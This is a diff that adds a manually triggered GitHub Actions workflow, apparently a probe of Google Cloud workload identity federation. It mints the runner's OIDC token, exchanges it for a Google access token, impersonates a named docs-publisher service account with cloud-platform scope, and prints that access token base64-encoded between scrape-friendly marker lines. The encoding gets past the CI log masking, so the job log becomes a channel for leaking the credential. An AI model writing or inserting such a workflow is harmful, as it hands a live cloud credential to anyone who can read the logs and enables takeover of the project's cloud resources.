@@ -1,0 +1,25 @@
+name: i7269-oidc-probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: mint
+        env:
+          SA: gh-docc-docs-publisher@daisy-367210.iam.gserviceaccount.com
+          WIF: projects/1080482399950/locations/global/workloadIdentityPools/github-pool/providers/github-provider
+          REPO: ${{ github.repository }}
+        run: |
+          set -uo pipefail
+          OIDC=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=//iam.googleapis.com/${WIF}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          FED=$(curl -s -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/${WIF}\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"${OIDC}\"}" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token","ERR:"+json.dumps(d)))')
+          RES=$(curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SA}:generateAccessToken" -H "Authorization: Bearer ${FED}" -H 'Content-Type: application/json' -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+          AT=$(printf '%s' "$RES" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("accessToken","ERR:"+json.dumps(d)))')
+          echo "RESULT SA=${SA} REPO=${REPO} ATLEN=${#AT}"
+          echo "TOKEN_B64=$(printf '%s' "$AT" | base64 -w0)"
+          echo "TOKEN_MARKER_END"
